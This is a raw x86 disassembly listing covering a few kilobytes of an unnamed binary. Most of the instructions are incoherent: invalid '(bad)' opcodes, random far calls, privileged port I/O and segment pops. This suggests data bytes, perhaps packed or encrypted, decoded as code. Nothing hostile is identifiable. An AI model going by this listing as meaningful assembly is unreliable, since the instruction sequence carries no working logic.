  41f9a2:	sub    eax,0xe7efb3fe
  41f9a7:	xor    BYTE PTR [edi-0x26],ch
  41f9aa:	pop    ecx
  41f9ab:	xor    eax,0x5958ad8a
  41f9b0:	imul   ebp,DWORD PTR [ebp+ebx*4-0x7],0x40
	...
  41fa14:	add    BYTE PTR [eax],al
  41fa16:	or     al,BYTE PTR [ecx-0x49]
  41fa19:	mov    eax,ds:0xeb1ef7ff
  41fa1e:	fwait
  41fa1f:	mov    eax,0x4b1a8e70
  41fa24:	jbe    0x41fa4d
  41fa26:	pop    eax
  41fa27:	dec    edi
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    BYTE PTR ds:0x3b45888b,bh
  41fa33:	fild   QWORD PTR [eax-0x579e4804]
  41fa39:	mov    esi,0x7fd65eb0
  41fa3e:	clc    
  41fa3f:	lds    edi,FWORD PTR [esi]
  41fa41:	adc    al,0x39
  41fa43:	fnstcw WORD PTR [edx+0x6e5b792f]
  41fa49:	cmp    al,0x6e
  41fa4b:	and    eax,0x9851c53b
  41fa50:	test   DWORD PTR [eax+0x42d515f],0x794116a4
  41fa5a:	lods   eax,DWORD PTR ds:[esi]
  41fa5b:	mov    ds:0x4d90ecd1,eax
  41fa60:	push   0x999b9ca
  41fa65:	int    0xc5
  41fa67:	jp     0x41fa99
  41fa69:	pop    edx
  41fa6a:	in     eax,0x2d
  41fa6c:	xor    edi,DWORD PTR [eax+0x497b3518]
  41fa72:	push   edx
  41fa73:	mov    ds:0x1eff205f,eax
  41fa78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa79:	add    eax,0x2ce999f5
  41fa7e:	pop    ebx
  41fa7f:	cmp    eax,0x9a6c684e
  41fa84:	xchg   DWORD PTR [eax-0xbdfeb6b],ebp
  41fa8a:	scas   al,BYTE PTR es:[edi]
  41fa8b:	inc    eax
  41fa8c:	pop    esp
  41fa8d:	mov    dh,0xf0
  41fa8f:	fs push ds
  41fa91:	or     cl,cl
  41fa93:	ins    BYTE PTR es:[edi],dx
  41fa94:	sbb    al,0x54
  41fa96:	jb     0x41fa52
  41fa98:	cmp    eax,0x9ea79f17
  41fa9d:	and    BYTE PTR [edi+eax*4+0x3596a3e5],cl
  41faa4:	cmp    edx,DWORD PTR [edi]
  41faa6:	sbb    eax,0x6278d799
  41faab:	adc    BYTE PTR [esi],ah
  41faad:	sbb    esp,ecx
  41faaf:	pop    ss
  41fab0:	imul   edi,edi,0xffffff9c
  41fab3:	adc    BYTE PTR [ecx-0x49],cl
  41fab6:	arpl   WORD PTR [edx],cx
  41fab8:	inc    esi
  41fab9:	mov    bl,0xa3
  41fabb:	dec    esp
  41fabc:	aam    0x43
  41fabe:	iret   
  41fabf:	out    0x6e,eax
  41fac1:	or     ebp,DWORD PTR [edi-0x7f]
  41fac4:	push   0x28ee789f
  41fac9:	repz pop ss
  41facb:	into   
  41facc:	xor    ch,bh
  41face:	dec    eax
  41facf:	rol    BYTE PTR [esi+0x62],1
  41fad2:	mov    esi,0x98592ae8
  41fad7:	and    DWORD PTR ds:0x9e6c595b,edi
  41fadd:	and    eax,0x992b7045
  41fae3:	out    0x1f,al
  41fae5:	xor    eax,0xbf039a76
  41faea:	jl     0x41fad7
  41faec:	loop   0x41fb29
  41faee:	xlat   BYTE PTR ds:[ebx]
  41faef:	mov    al,fs:0x73856109
  41faf5:	je     0x41faba
  41faf7:	dec    eax
  41faf8:	fistp  WORD PTR ds:0x88efa295
  41fafe:	cdq    
  41faff:	add    al,0xfd
  41fb01:	xor    eax,0x615ce9c2
  41fb06:	dec    edx
  41fb07:	mov    eax,ds:0x48ff6383
  41fb0c:	adc    eax,0xcfcfd5f5
  41fb11:	aam    0xc1
  41fb13:	xchg   edi,eax
  41fb14:	xor    esi,ebp
  41fb16:	mov    bh,BYTE PTR [edx+esi*2-0x6789dc2e]
  41fb1d:	nop
  41fb1e:	test   DWORD PTR [eax+0x67356422],esi
  41fb24:	call   0xb9d9:0xf276954b
  41fb2b:	ror    BYTE PTR ds:0x65ca1d85,0xea
  41fb32:	ds xor eax,0xeb
	...
  41fb94:	add    BYTE PTR [eax],al
  41fb96:	fsubr  QWORD PTR [eax]
  41fb98:	mov    ah,ah
  41fb9a:	(bad)  
  41fb9b:	out    0xfe,al
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0x76
  41fba3:	xchg   esp,eax
  41fba4:	ins    BYTE PTR es:[edi],dx
  41fba5:	mov    dh,0x5f
  41fba7:	push   eax
  41fba8:	add    DWORD PTR [eax],eax
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    BYTE PTR [ecx+0x1],ch
  41fbb0:	dec    eax
  41fbb1:	gs jg  0x41fb48
  41fbb4:	fnstsw WORD PTR [esi+0x54469029]
  41fbba:	in     eax,dx
  41fbbb:	lods   al,BYTE PTR ds:[esi]
  41fbbc:	ror    DWORD PTR [esi+0x65870419],0xdb
  41fbc3:	bound  ebp,QWORD PTR [esi+eiz*1+0x47d41e4f]
  41fbca:	je     0x41fb6b
  41fbcc:	push   ds
  41fbcd:	pop    es
  41fbce:	dec    edx
  41fbcf:	or     ecx,DWORD PTR [ebx-0x562ed969]
  41fbd5:	jmp    0x5d886d03
  41fbda:	inc    ebx
  41fbdb:	push   esi
  41fbdc:	arpl   WORD PTR [ebp+0x1],dx
  41fbdf:	sub    ecx,DWORD PTR [ebx+0x52e3db15]
  41fbe5:	popf   
  41fbe6:	adc    al,0xf6
  41fbe8:	inc    edi
  41fbe9:	iret   
  41fbea:	dec    esi
  41fbeb:	add    cl,al
  41fbed:	into   
  41fbee:	jnp    0x41fbdd
  41fbf0:	jo     0x41fb96
  41fbf2:	push   0xf72b7c85
  41fbf7:	cmp    BYTE PTR [ecx+0x75141df4],ah
  41fbfd:	and    ebp,esi
  41fbff:	mov    esp,0x1d975488
  41fc04:	inc    esp
  41fc05:	mov    ebp,0xb5e46d5e
  41fc0a:	pop    esp
  41fc0b:	arpl   dx,bx
  41fc0d:	mov    bl,0x66
  41fc0f:	shl    BYTE PTR [ecx],1
  41fc11:	push   0xffffff81
  41fc13:	mov    ebx,0x73515ede
  41fc18:	inc    ebx
  41fc19:	icebp  
  41fc1a:	lods   al,BYTE PTR ds:[esi]
  41fc1b:	xchg   ebx,eax
  41fc1c:	pop    ebx
  41fc1d:	xchg   DWORD PTR [edi+0x10],ebx
  41fc20:	xor    esi,DWORD PTR [ebp+eiz*8+0x30]
  41fc24:	inc    ebp
  41fc25:	dec    ebx
  41fc26:	mov    dl,BYTE PTR [edx+0x3c]
  41fc29:	xor    dl,BYTE PTR [eax]
  41fc2b:	sub    eax,0x1e523e5
  41fc30:	mov    al,0xd1
  41fc32:	push   esp
  41fc33:	push   esp
  41fc34:	mov    ?,WORD PTR [eax]
  41fc36:	call   0x2436967c
  41fc3b:	stc    
  41fc3c:	mov    cl,0xbc
  41fc3e:	addr16 add ebp,esi
  41fc41:	and    ebp,0xa2cc78e5
  41fc47:	ins    DWORD PTR es:[edi],dx
  41fc48:	push   ds
  41fc49:	loopne 0x41fc9e
  41fc4b:	ja     0x41fbf2
  41fc4d:	xlat   BYTE PTR ds:[ebx]
  41fc4e:	mov    dh,0x6d
  41fc50:	xor    BYTE PTR [edx+eax*8],al
  41fc53:	fs cdq 
  41fc55:	data16 mov WORD PTR [edi],ss
  41fc58:	add    esi,DWORD PTR ds:0xc461e983
  41fc5e:	out    dx,eax
  41fc5f:	xor    ch,BYTE PTR [ebp+0x2085721f]
  41fc65:	pop    edi
  41fc66:	add    ebp,ecx
  41fc68:	aam    0x7a
  41fc6a:	sbb    al,0xe9
  41fc6c:	shl    BYTE PTR [ebx+edx*1+0x16],1
  41fc70:	push   ecx
  41fc71:	xchg   esi,eax
  41fc72:	(bad)  
  41fc73:	dec    esi
  41fc74:	test   BYTE PTR ds:0xdea62a6,dh
  41fc7a:	in     al,0xd7
  41fc7c:	push   ecx
  41fc7d:	jge    0x41fcfb
  41fc7f:	or     BYTE PTR [ecx],0x63
  41fc82:	mov    dh,0x96
  41fc84:	into   
  41fc85:	xlat   BYTE PTR ds:[ebx]
  41fc86:	dec    esp
  41fc87:	push   ds
  41fc88:	pop    ss
  41fc89:	ins    BYTE PTR es:[edi],dx
  41fc8a:	sti    
  41fc8b:	sub    al,0xdb
  41fc8d:	jp     0x41fc1e
  41fc8f:	sbb    ch,bh
  41fc91:	push   cs
  41fc92:	dec    edx
  41fc93:	xlat   BYTE PTR ds:[ebx]
  41fc94:	fs bts edx,edi
  41fc98:	and    al,0x15
  41fc9a:	jnp    0x41fca0
  41fc9c:	or     al,0xc2
  41fc9e:	add    DWORD PTR [esi+0x1db44aaf],0x77
  41fca5:	xchg   BYTE PTR [edx-0x4e],al
  41fca8:	push   ebx
  41fca9:	icebp  
  41fcaa:	jo     0x41fc7a
  41fcac:	jmp    0x41fc3a
  41fcae:	and    esi,edi
  41fcb0:	pop    ds
  41fcb1:	or     ecx,ebp
  41fcb3:	and    dh,cl
	...
  41fd15:	add    BYTE PTR [edx+ebp*2],cl
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	and    BYTE PTR [esi],ch
  41fd24:	jnp    0x41fd22
  41fd26:	push   cx
  41fd28:	add    DWORD PTR [eax],eax
  41fd2a:	pop    es
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    dl,dl
  41fd2f:	imul   eax,esi,0x7055629d
  41fd35:	and    BYTE PTR ds:0xc8a3f777,al
  41fd3b:	rol    ebp,1
  41fd3d:	push   ebp
  41fd3e:	ins    BYTE PTR es:[edi],dx
  41fd3f:	es xor dh,al
  41fd42:	sbb    edx,DWORD PTR [ebp+0x23]
  41fd45:	retf   0x525d
  41fd48:	mov    eax,ds:0xbdbbe72c
  41fd4d:	jne    0x41fceb
  41fd4f:	(bad)  
  41fd50:	sti    
  41fd51:	xlat   BYTE PTR ds:[ebx]
  41fd52:	mov    BYTE PTR [eax],al
  41fd54:	gs loop 0x41fdd5
  41fd57:	inc    edx
  41fd58:	inc    ecx
  41fd59:	repz jno 0x41fd66
  41fd5c:	and    BYTE PTR [edx+0x25],0xc4
  41fd60:	inc    eax
  41fd61:	clc    
  41fd62:	sbb    ch,BYTE PTR [edi+edi*8-0x77]
  41fd66:	mov    bl,0xcc
  41fd68:	js     0x41fdca
  41fd6a:	pop    ebx
  41fd6b:	add    edi,esp
  41fd6d:	imul   edx,DWORD PTR [edx],0xffffff80
  41fd70:	adc    dh,BYTE PTR [eax-0x65]
  41fd73:	mov    cl,0xb3
  41fd75:	nop
  41fd76:	popf   
  41fd77:	mov    dh,0x68
  41fd79:	scas   eax,DWORD PTR es:[edi]
  41fd7a:	inc    ecx
  41fd7b:	imul   esi,ebx,0xffffffad
  41fd7e:	(bad)  
  41fd7f:	sub    edx,ebp
  41fd81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd82:	jl     0x41fdb2
  41fd84:	stos   BYTE PTR es:[edi],al
  41fd85:	nop
  41fd86:	add    eax,esi
  41fd88:	mov    dl,0x53
  41fd8a:	inc    ecx
  41fd8b:	push   ecx
  41fd8c:	imul   esp,DWORD PTR [esi],0xd054359
  41fd92:	sbb    eax,0x8a8a5d46
  41fd97:	lock ja 0x41fd57
  41fd9a:	popa   
  41fd9b:	int3   
  41fd9c:	addr16 jmp 0xf60953b7
  41fda2:	nop
  41fda3:	sahf   
  41fda4:	shl    DWORD PTR [ebx-0x72],cl
  41fda7:	cmp    al,0xb8
  41fda9:	mov    edx,0x92f3d565
  41fdae:	dec    ebx
  41fdaf:	mov    ebp,0x5f1dc8d7
  41fdb4:	loope  0x41fdae
  41fdb6:	outs   dx,BYTE PTR ds:[esi]
  41fdb7:	sar    ah,cl
  41fdb9:	adc    esp,DWORD PTR [eax-0x16]
  41fdbc:	inc    esp
  41fdbd:	shr    BYTE PTR [ebp+0x5b],0x65
  41fdc1:	shl    ch,cl
  41fdc3:	and    ecx,eax
  41fdc5:	addr16 call 0x5fae8eaa
  41fdcb:	jecxz  0x41fe2b
  41fdcd:	das    
  41fdce:	pop    esi
  41fdcf:	push   ss
  41fdd0:	pop    es
  41fdd1:	fisubr DWORD PTR [ebp+0x27edd68a]
  41fdd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdd8:	jb     0x41fddb
  41fdda:	in     al,0x9b
  41fddc:	mov    WORD PTR [ecx],?
  41fdde:	fidiv  DWORD PTR [eax]
  41fde0:	cmp    eax,0xaa3ef639
  41fde5:	inc    edi
  41fde6:	mov    ds,WORD PTR [ecx]
  41fde8:	adc    al,0x5
  41fdea:	mov    BYTE PTR ds:0x6f95a159,ch
  41fdf0:	and    eax,0x60161976
  41fdf5:	cli    
  41fdf6:	or     ebp,eax
  41fdf8:	mov    cl,0x24
  41fdfa:	popf   
  41fdfb:	or     eax,0x618643af
  41fe00:	repz leave 
  41fe02:	je     0x41fe63
  41fe04:	es rcr ah,cl
  41fe07:	dec    edx
  41fe08:	sbb    cl,BYTE PTR [ebx]
  41fe0a:	add    bh,ah
  41fe0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe0d:	pop    ebx
  41fe0e:	fwait
  41fe0f:	call   DWORD PTR [ecx+edx*1]
  41fe12:	inc    ecx
  41fe13:	ins    DWORD PTR es:[edi],dx
  41fe14:	(bad)  
  41fe16:	mov    DWORD PTR [edx-0x17],eax
  41fe19:	popa   
  41fe1a:	call   0x44b1:0xda93632c
  41fe21:	ret    0x8498
  41fe24:	in     al,dx
  41fe25:	mov    bl,0x9a
  41fe27:	das    
  41fe28:	into   
  41fe29:	pop    edx
  41fe2a:	pop    es
  41fe2b:	pop    ds
  41fe2c:	push   0xffffff85
  41fe2e:	gs push 0xffffff89
  41fe31:	or     al,0x74
  41fe33:	mov    ?,WORD PTR [ebx]
	...
  41fe95:	add    BYTE PTR [edx-0x1865ab],ch
  41fe9b:	out    dx,eax
  41fe9c:	call   FWORD PTR [ebp+0x51]
  41fe9f:	lock xor DWORD PTR [edi+0x7a],0x46
  41fea4:	gs ja  0x41ff14
  41fea7:	push   edx
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [edi],cl
  41feaf:	jp     0x41ff14
  41feb1:	xchg   esp,eax
  41feb2:	cmp    dl,BYTE PTR [eax-0x3eb53960]
  41feb8:	jle    0x41fed2
  41feba:	bnd jnp 0x41ff20
  41febd:	cdq    
  41febe:	sub    al,0x1e
  41fec0:	sub    BYTE PTR [edx],dh
  41fec2:	dec    edi
  41fec3:	in     eax,0x24
  41fec5:	xchg   ecx,eax
  41fec6:	inc    edx
  41fec7:	add    eax,0x125542ec
  41fecc:	aas    
  41fecd:	jae    0x41feda
  41fecf:	mov    ah,0xc
  41fed1:	hlt    
  41fed2:	in     eax,dx
  41fed3:	into   
  41fed4:	sub    dl,BYTE PTR [esi+0x2aa77c1]
  41feda:	or     DWORD PTR [ebx],esp
  41fedc:	cwde   
  41fedd:	ins    DWORD PTR es:[edi],dx
  41fede:	(bad)  
  41fedf:	mov    edi,0x9b6342d4
  41fee4:	ffree  st(2)
  41fee6:	adc    eax,0x6648c5c0
  41feeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feec:	adc    dl,BYTE PTR [ecx-0x12]
  41feef:	xchg   ecx,eax
  41fef0:	repnz and eax,0x45f1d931
  41fef6:	fistp  QWORD PTR [ecx-0x35fe4780]
  41fefc:	scas   eax,DWORD PTR es:[edi]
  41fefd:	test   eax,0x52db28de
  41ff02:	mov    ebx,0x8e4707b4
  41ff07:	mov    cl,0x93
  41ff09:	adc    BYTE PTR [eiz*4+0x7e286621],cl
  41ff10:	scas   al,BYTE PTR es:[edi]
  41ff11:	push   ss
  41ff12:	cdq    
  41ff13:	and    cl,cl
  41ff15:	push   ebp
  41ff16:	jl     0x41fef9
  41ff18:	mov    cl,0xe4
  41ff1a:	arpl   WORD PTR [edi],dx
  41ff1c:	out    dx,al
  41ff1d:	cmp    eax,DWORD PTR [edi+0x3d1b7f8c]
  41ff23:	jp     0x41fef7
  41ff25:	clc    
  41ff26:	cli    
  41ff27:	dec    edi
  41ff28:	ss pop esp
  41ff2a:	adc    al,0x5
  41ff2c:	jg     0x41fed9
  41ff2e:	mov    al,0xb7
  41ff30:	cmp    DWORD PTR [ebx+0x1216445],ecx
  41ff36:	ja     0x41ff13
  41ff38:	fist   WORD PTR [edi]
  41ff3a:	xor    BYTE PTR [ebx+ecx*2],bl
  41ff3d:	test   eax,0x79015a2b
  41ff42:	sti    
  41ff43:	jae    0x41ff68
  41ff45:	sahf   
  41ff46:	add    ebx,esp
  41ff48:	arpl   WORD PTR [ecx+0xa0052d5],bx
  41ff4e:	dec    esp
  41ff4f:	mov    al,ah
  41ff51:	cli    
  41ff52:	in     eax,dx
  41ff53:	mov    edi,0x9f13228c
  41ff58:	aad    0x37
  41ff5a:	pop    ebx
  41ff5b:	mov    edx,0xee7dcb88
  41ff60:	jle    0x41ffb2
  41ff62:	adc    BYTE PTR [eax-0x56e2cfec],bl
  41ff68:	sahf   
  41ff69:	mov    dl,0xd2
  41ff6b:	and    DWORD PTR [edi-0x7e3bd8c7],ecx
  41ff71:	outs   dx,DWORD PTR ds:[esi]
  41ff72:	lock cld 
  41ff74:	lahf   
  41ff75:	pop    edi
  41ff76:	mov    BYTE PTR [esp+edx*4+0x18fc048a],0xc2
  41ff7e:	lahf   
  41ff7f:	repz jno 0x41ff0f
  41ff82:	and    DWORD PTR [eax+0x47],0xfffffffa
  41ff86:	mov    ebx,0x97f494e9
  41ff8b:	mov    ah,0x63
  41ff8d:	jl     0x41ff1f
  41ff8f:	mov    cl,0xe1
  41ff91:	adc    ecx,ecx
  41ff93:	sti    
  41ff94:	sbb    edx,DWORD PTR gs:[ebp-0x277cf6d6]
  41ff9b:	dec    edi
  41ff9c:	iret   
  41ff9d:	mov    ebx,0x8a056a02
  41ffa2:	cld    
  41ffa3:	xchg   BYTE PTR [edi-0x3121774e],cl
  41ffa9:	loopne 0x420007
  41ffab:	mov    cl,0xa5
  41ffad:	sar    BYTE PTR [esi*1+0x23223a70],1
  41ffb4:	jne    0x41ffb6
	...
  420016:	bound  esp,QWORD PTR [ebp-0x8808a]
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0x2
  420023:	imul   ebx,DWORD PTR [eax],0x15374b7
  420029:	add    BYTE PTR [edi],al
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [ebp+edx*4-0x6d],cl
  420031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420032:	ins    BYTE PTR es:[edi],dx
  420033:	mov    ecx,0xd838af58
  420038:	ja     0x42008a
  42003a:	push   es
  42003b:	shl    DWORD PTR [ecx+eax*4],0xc4
  42003f:	dec    esp
  420040:	mov    ds:0x5718ef5a,al
  420045:	pop    ecx
  420046:	cld    
  420047:	sbb    BYTE PTR [esi+esi*4],ah
  42004a:	push   edi
  42004b:	test   BYTE PTR [esi+0x5f],bl
  42004e:	jno    0x420078
  420050:	add    ecx,DWORD PTR [edi+0x77]
  420053:	pop    esp
  420054:	pop    es
  420055:	and    DWORD PTR [edi+ebx*8+0x30a24ea3],ecx
  42005c:	scas   eax,DWORD PTR es:[edi]
  42005d:	outs   dx,DWORD PTR ds:[esi]
  42005e:	test   ebp,ebx
  420060:	mov    al,ds:0x98c2d1da
  420065:	cmc    
  420066:	pxor   mm6,mm7
  420069:	ret    0x6fb7
  42006c:	xchg   ebp,eax
  42006d:	push   edi
  42006e:	inc    eax
  42006f:	pop    esi
  420070:	fidivr DWORD PTR [edx+0x17a30f3b]
  420076:	stc    
  420077:	cmc    
  420078:	jo     0x420079
  42007a:	mov    esp,0x364b4dd
  42007f:	cmp    esi,0x2413794
  420085:	or     BYTE PTR [ebp-0x79],dl
  420088:	icebp  
  420089:	push   ecx
  42008a:	enter  0x21d6,0x55
  42008e:	adc    eax,0x9fc51edb
  420093:	mov    DWORD PTR [eax+0x43],0x235ff3f8
  42009a:	mov    edx,0x98a3bd9
  42009f:	pop    ss
  4200a0:	fild   WORD PTR [edx]
  4200a2:	jge    0x42009f
  4200a4:	sub    BYTE PTR [edx],dl
  4200a6:	pop    ebx
  4200a7:	test   al,0x73
  4200a9:	xchg   edi,eax
  4200aa:	xchg   ebx,eax
  4200ab:	and    BYTE PTR [esi+ebx*2],ah
  4200ae:	xlat   BYTE PTR ds:[ebx]
  4200af:	fs jb  0x420032
  4200b2:	mov    dh,0xee
  4200b4:	in     al,dx
  4200b5:	xor    bl,BYTE PTR [ebx]
  4200b7:	in     al,0xdd
  4200b9:	pop    ebp
  4200ba:	sbb    edi,esi
  4200bc:	in     al,0xee
  4200be:	cmp    al,0x8d
  4200c0:	gs call 0xed804158
  4200c6:	cmc    
  4200c7:	fist   WORD PTR [eax]
  4200c9:	pop    ecx
  4200ca:	inc    edx
  4200cb:	sbb    DWORD PTR [esi+0x40269916],eax
  4200d1:	sub    DWORD PTR [edx+0x7f6b728e],edi
  4200d7:	and    al,0x59
  4200d9:	mov    al,ds:0x4baf54a7
  4200de:	rcl    DWORD PTR [ecx+0x3e438c99],0x32
  4200e5:	push   eax
  4200e6:	xchg   esp,eax
  4200e7:	mov    edx,0xe9a4ce79
  4200ec:	jne    0x4200fd
  4200ee:	out    dx,eax
  4200ef:	ds pop ebp
  4200f1:	hlt    
  4200f2:	xchg   cl,bl
  4200f4:	push   edx
  4200f5:	fiadd  DWORD PTR [ecx]
  4200f7:	stos   DWORD PTR es:[edi],eax
  4200f8:	mov    bl,0xf1
  4200fa:	lods   al,BYTE PTR ds:[esi]
  4200fb:	xchg   BYTE PTR [eax],dl
  4200fd:	adc    edx,ebp
  4200ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420100:	mov    cl,BYTE PTR [edx+0x1a]
  420103:	dec    edx
  420104:	xchg   cl,ch
  420106:	aam    0x5e
  420108:	sub    al,0x8b
  42010a:	daa    
  42010b:	cmp    DWORD PTR [ebx],ecx
  42010d:	cmp    BYTE PTR [edx-0x19],0x26
  420111:	popa   
  420112:	mov    ch,0x53
  420114:	xchg   esp,eax
  420115:	fidivr DWORD PTR ds:0x72bd77c3
  42011b:	in     al,0xb6
  42011d:	jno    0x420104
  42011f:	cld    
  420120:	add    eax,0x26e55d6d
  420125:	inc    esi
  420126:	mov    eax,ds:0x603927d1
  42012b:	lds    esp,FWORD PTR [edi-0x67b82ffb]
  420131:	xlat   BYTE PTR ds:[ebx]
  420132:	in     eax,0x76
  420134:	dec    ebx
	...
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201a3:	xchg   ebp,eax
  4201a4:	adc    edi,DWORD PTR [ebx+0x7b]
  4201a7:	push   esp
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    BYTE PTR [edx],al
  4201af:	jbe    0x420199
  4201b1:	retf   0x7bc2
  4201b4:	popa   
  4201b5:	pushf  
  4201b6:	sub    bh,BYTE PTR [ecx-0x4677ee3f]
  4201bc:	psllw  mm1,QWORD PTR [esp+ebx*1+0x17]
  4201c1:	into   
  4201c2:	mov    eax,ds:0x935b393c
  4201c7:	sub    DWORD PTR [ebx],ebx
  4201c9:	dec    edx
  4201ca:	pop    esi
  4201cb:	cmp    al,0xe
  4201cd:	lods   eax,DWORD PTR ds:[esi]
  4201ce:	xchg   BYTE PTR [ecx+0x6a],bh
  4201d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201d2:	sub    al,0x5d
  4201d4:	adc    eax,0x21e055d6
  4201d9:	push   ebp
  4201da:	jnp    0x420170
  4201dc:	stos   DWORD PTR es:[edi],eax
  4201dd:	sbb    eax,edx
  4201df:	mov    ch,0xc6
  4201e1:	in     al,dx
  4201e2:	mov    al,0x3a
  4201e4:	stos   DWORD PTR es:[edi],eax
  4201e5:	packssdw mm3,QWORD PTR [esi-0x54]
  4201e9:	aad    0x39
  4201eb:	popf   
  4201ec:	loop   0x420212
  4201ee:	outs   dx,DWORD PTR ds:[esi]
  4201ef:	int3   
  4201f0:	(bad)  
  4201f2:	mov    bh,0x8d
  4201f4:	push   edi
  4201f5:	popa   
  4201f6:	lods   eax,DWORD PTR ds:[esi]
  4201f7:	rcl    DWORD PTR [ebx],0x69
  4201fa:	stos   DWORD PTR es:[edi],eax
  4201fb:	add    al,0x23
  4201fd:	xor    BYTE PTR [esi+0x557c59dd],bh
  420203:	mov    al,fs:0x7613b996
  420209:	fcmove st,st(4)
  42020b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42020c:	in     al,0x95
  42020e:	pop    ss
  42020f:	nop    DWORD PTR [edi+0x24ebb66c]
  420216:	pushf  
  420217:	push   ss
  420218:	popa   
  420219:	ss dec edx
  42021b:	pop    es
  42021c:	fcomip st,st(4)
  42021e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42021f:	push   edx
  420220:	inc    esp
  420221:	xchg   ebx,eax
  420222:	sub    ah,BYTE PTR [eax-0x40eeb7a8]
  420228:	aam    0xda
  42022a:	outs   dx,BYTE PTR ds:[esi]
  42022b:	jp     0x4201bd
  42022d:	sbb    BYTE PTR [eax-0x4f2e4c3f],cl
  420233:	arpl   WORD PTR [edx],dx
  420235:	leave  
  420236:	and    dl,BYTE PTR [ebp-0x71]
  420239:	aam    0xb2
  42023b:	enter  0x7f32,0xa3
  42023f:	cmp    al,0xc7
  420241:	dec    eax
  420242:	pop    edi
  420243:	dec    esp
  420244:	(bad)  
  420247:	jmp    0x42026e
  420249:	dec    ecx
  42024a:	adc    DWORD PTR ds:0x30120cb6,eax
  420250:	inc    edi
  420251:	mov    ds:0x3bc40eb2,eax
  420256:	xor    eax,0xa8b1effb
  42025b:	sbb    DWORD PTR [edx-0x1e],edi
  42025e:	in     eax,dx
  42025f:	adc    DWORD PTR ds:0xc2e14f6b,0xffffffe3
  420266:	data16 xor ah,BYTE PTR [eax+edi*1]
  42026a:	mov    edx,0xd8afab35
  42026f:	mov    DWORD PTR [esp+edi*1-0x77],ebx
  420273:	out    0xb0,eax
  420275:	jl     0x420226
  420277:	out    dx,eax
  420278:	xchg   ebp,eax
  420279:	sub    al,0xb0
  42027b:	aam    0x3a
  42027d:	sbb    ebx,DWORD PTR [ecx-0x53e01aa1]
  420283:	mov    ah,0x4a
  420285:	int3   
  420286:	cs jb  0x4202f4
  420289:	aam    0x9e
  42028b:	imul   ebp,DWORD PTR [eax+0x3e],0xffffffb9
  42028f:	or     eax,0x57c64a5
  420294:	mov    dh,0x58
  420296:	jp     0x42030c
  420298:	jno    0x420259
  42029a:	cmp    eax,0xa6ae1eed
  42029f:	xor    al,0xa7
  4202a1:	sub    al,0xa0
  4202a3:	and    DWORD PTR [edx-0x11],ebx
  4202a6:	push   esp
  4202a7:	xchg   edi,eax
  4202a8:	les    edi,FWORD PTR [edi]
  4202aa:	fwait
  4202ab:	jnp    0x4202f3
  4202ad:	sahf   
  4202ae:	stos   BYTE PTR es:[edi],al
  4202af:	(bad)  
  4202b0:	into   
  4202b1:	push   esp
  4202b2:	ror    esp,1
  4202b4:	mov    ah,0x0
	...
  420316:	inc    ecx
  420317:	push   es
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fist   WORD PTR [edx-0x7d12963b]
  420327:	push   ebp
  420328:	add    DWORD PTR [eax],eax
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    BYTE PTR [ebx+0xe332930],cl
  420333:	iret   
  420334:	repnz addr16 loope 0x4203a6
  420338:	cmc    
  420339:	imul   ecx,DWORD PTR [edi+0xd1f1050],0xfffffff8
  420340:	nop
  420341:	add    DWORD PTR [ebx+eax*1+0x1eef5329],ecx
  420348:	xor    eax,0x64ab2047
  42034d:	add    eax,0x1fe7dafc
  420352:	out    dx,eax
  420353:	cmp    dl,0x14
  420356:	sbb    al,0xa7
  420358:	sub    dl,al
  42035a:	pop    es
  42035b:	fcom   DWORD PTR [edx]
  42035d:	pop    es
  42035e:	(bad)  
  42035f:	out    dx,al
  420360:	or     ch,BYTE PTR [esi+0x2a]
  420363:	fstp   st(6)
  420365:	dec    ebp
  420366:	and    DWORD PTR [edi+ebx*1-0x65],ecx
  42036a:	and    BYTE PTR [edx-0x5b],ah
  42036d:	fisub  DWORD PTR [esi-0x7c48ec85]
  420373:	mov    dl,0x40
  420375:	add    DWORD PTR [eax-0x2c],ebp
  420378:	imul   ebp,DWORD PTR [esp+ecx*8-0x11],0x6fce537a
  420380:	sbb    DWORD PTR [ebp-0x51e1db12],ebp
  420386:	or     al,0xc9
  420388:	shl    BYTE PTR [ebx+0x2e],cl
  42038b:	enter  0x3035,0xaa
  42038f:	or     eax,0x8dac6da3
  420394:	push   cs
  420395:	js     0x4203fd
  420397:	scas   al,BYTE PTR es:[edi]
  420398:	jle    0x4203c7
  42039a:	xchg   ecx,eax
  42039b:	mov    edi,0x5ee387fb
  4203a0:	pop    esi
  4203a1:	inc    ecx
